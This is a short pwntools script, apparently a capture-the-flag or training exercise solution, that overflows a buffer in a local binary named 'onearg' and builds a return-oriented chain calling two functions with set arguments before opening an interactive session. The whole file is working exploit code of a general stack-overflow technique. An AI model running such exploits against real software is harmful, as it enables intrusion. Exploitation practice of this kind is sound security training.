from pwn import *

p = process("./onearg")

EGG = "A"*16 # Offset to return address

f1 = 0x080484b6
poppopret = 0x0804861a
f2 = 0x080484e2

EGG += p32(f1) # Add address for f1
EGG += p32(poppopret) # Return address to pop off f1 args -- pop edi, pop ebp, ret
EGG += p32(0xdeadbeef) # Arg 'a' for f1
EGG += p32(0xcafebabe) # Arg 'b' for f1
EGG += p32(f2) # Add address for f2
EGG += p32(0x41414141) # Return address for f2 doesn't matter
EGG += p32(0x41414141) # Arg 'a' for f2 (value doesn't matter)
EGG += p32(0x1337dad0) # Arg 'b' for f2

p.sendline(EGG)

p.interactive()